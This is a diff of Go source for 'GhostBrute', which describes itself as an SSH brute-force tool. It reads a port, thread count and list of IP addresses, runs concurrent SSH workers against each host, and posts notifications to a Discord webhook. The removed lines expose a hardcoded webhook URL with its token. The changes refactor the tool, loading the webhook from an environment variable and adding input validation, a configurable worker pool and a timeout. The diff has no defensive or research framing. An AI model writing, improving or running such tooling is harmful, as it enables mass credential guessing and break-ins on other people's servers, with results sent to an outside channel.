@@ -5,12 +5,11 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"log"
 	"net"
 	"net/http"
 	"os"
-	"os/exec"
 	"runtime"
 	"strconv"
 	"strings"
@@ -20,14 +19,15 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-const (
-	hardcorewebhook = "https://discord.com/api/webhooks/1199622995040280576/Il4yqAF8NVkXa2SRFShERIqxFFXVB4DNfmNOFLEP9WAVF1khOxH8xZLSCfI4VI8OHzKG"
-)
+// Configuration - Discord webhook URL should be loaded from env or config
+var discordWebhookURL string
 
-// Funcție dummy pentru a folosi pachetele importate
-func useUnusedPackages() {
-	_, _ = ioutil.ReadFile("dummy.txt") // Utilizare pentru `io/ioutil`
-	_ = exec.Command("echo", "dummy")  // Utilizare pentru `os/exec`
+func init() {
+	// Load from environment variable for security
+	discordWebhookURL = os.Getenv("DISCORD_WEBHOOK_URL")
+	if discordWebhookURL == "" {
+		log.Println("[!] Warning: DISCORD_WEBHOOK_URL not set in environment")
+	}
 }
 
 func checkThreads(routines int, thread int64) bool {
@@ -45,15 +45,27 @@ func fileExists(filename string) bool {
 	return !os.IsNotExist(err) && !info.IsDir()
 }
 
-func init() {
-	useUnusedPackages() // Apelăm funcția pentru a folosi pachetele
+func initFlags() {
 	if len(os.Args) <= 3 {
-		fmt.Println("Usage: [brute] [port] [threads] [iplist]")
+		fmt.Println("Usage: ghostbrute <port> <threads> <iplist>")
+		fmt.Println("  port:    SSH port number (default: 22)")
+		fmt.Println("  threads: Number of concurrent workers (default: 5)")
+		fmt.Println("  iplist:  File containing IP addresses (one per line)")
 		os.Exit(1)
-	} else {
-		ipfile = os.Args[3]
-		threads = os.Args[2]
-		port = os.Args[1]
+	}
+	port = os.Args[1]
+	threads = os.Args[2]
+	ipfile = os.Args[3]
+	
+	// Validate input
+	if _, err := strconv.Atoi(port); err != nil {
+		log.Fatalf("Invalid port: %s", port)
+	}
+	if _, err := strconv.Atoi(threads); err != nil {
+		log.Fatalf("Invalid thread count: %s", threads)
+	}
+	if !fileExists(ipfile) {
+		log.Fatalf("IP list file not found: %s", ipfile)
 	}
 }
 
@@ -101,16 +113,31 @@ type Footer struct {
 	Text string `json:"text,omitempty"`
 }
 
-func toDiscord(message DiscordMessage, webhookURL string) {
-	payload, err := json.Marshal(message)
-	if err != nil {
+func toDiscord(message DiscordMessage) {
+	if discordWebhookURL == "" {
+		log.Println("[*] Discord webhook not configured, skipping notification")
 		return
 	}
-	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(payload))
+	
+	payload, err := json.Marshal(message)
 	if err != nil {
+		log.Printf("[!] Failed to marshal Discord message: %v", err)
+		return
+	}
+	
+	resp, err := http.Post(discordWebhookURL, "application/json", bytes.NewBuffer(payload))
+	if err != nil {
+		log.Printf("[!] Failed to send Discord notification: %v", err)
 		return
 	}
 	defer resp.Body.Close()
+	
+	// Read and discard response body
+	io.ReadAll(resp.Body)
+	
+	if resp.StatusCode >= 400 {
+		log.Printf("[!] Discord API error: HTTP %d", resp.StatusCode)
+	}
 }
 
 func readLines(path string) ([]string, error) {
@@ -183,49 +210,74 @@ func worker(id int, jobs <-chan string, wg *sync.WaitGroup) {
 }
 
 func main() {
+	log.SetFlags(log.LstdFlags | log.Lshortfile)
+	log.Println("[*] GhostBrute v1.6.0+ - SSH Brute Force Tool")
+	
+	initFlags()
+	
+	log.Printf("[*] Configuration: port=%s threads=%s ipfile=%s", port, threads, ipfile)
+	
 	lines, err := readLines(ipfile)
 	if err != nil {
-		log.Fatalf("readLines: %s", err)
+		log.Fatalf("Failed to read IP list: %s", err)
 	}
-
-	var wg sync.WaitGroup
+	
+	log.Printf("[*] Loaded %d lines from IP list", len(lines))
+	
+	// Deduplicate IPs
 	uniqueIPs := make(map[string]bool)
-
 	for _, line := range lines {
 		ip := strings.TrimSpace(line)
-		if ip != "" {
+		if ip != "" && !strings.HasPrefix(ip, "#") { // Skip comments
 			uniqueIPs[ip] = true
 		}
 	}
-
+	
 	var ips []string
 	for ip := range uniqueIPs {
 		ips = append(ips, ip)
 	}
-
-	// Create a channel to pass jobs (IP addresses) to workers
+	
+	log.Printf("[*] %d unique IPs to process", len(ips))
+	
+	numWorkers, _ := strconv.Atoi(threads)
+	if numWorkers < 1 {
+		numWorkers = 5
+	}
+	
+	var wg sync.WaitGroup
 	jobs := make(chan string, len(ips))
-
+	
+	log.Printf("[*] Launching %d worker goroutines", numWorkers)
+	
 	// Launch workers
-	numWorkers := 5 // Define the number of concurrent workers
 	for w := 1; w <= numWorkers; w++ {
 		wg.Add(1)
 		go worker(w, jobs, &wg)
 	}
-
+	
 	// Send the IPs to the workers
-	for _, ip := range ips {
-		jobs <- ip
+	go func() {
+		for _, ip := range ips {
+			jobs <- ip
+		}
+		close(jobs)
+	}()
+	
+	// Wait for completion with timeout
+	timeout := 120 * time.Second
+	completed := make(chan struct{})
+	go func() {
+		wg.Wait()
+		close(completed)
+	}()
+	
+	select {
+	case <-completed:
+		log.Println("[+] All workers completed successfully")
+	case <-time.After(timeout):
+		log.Printf("[!] Execution timeout after %s", timeout)
 	}
-	close(jobs)
-
-	// Wait for all workers to complete
-	wg.Wait()
-
-	timeout := 90 * time.Second
-	if waitTimeout(&wg, timeout) {
-		fmt.Println("Execution timed out")
-	} else {
-		fmt.Println("Execution completed")
-	}
+	
+	log.Println("[*] GhostBrute execution finished")
 }
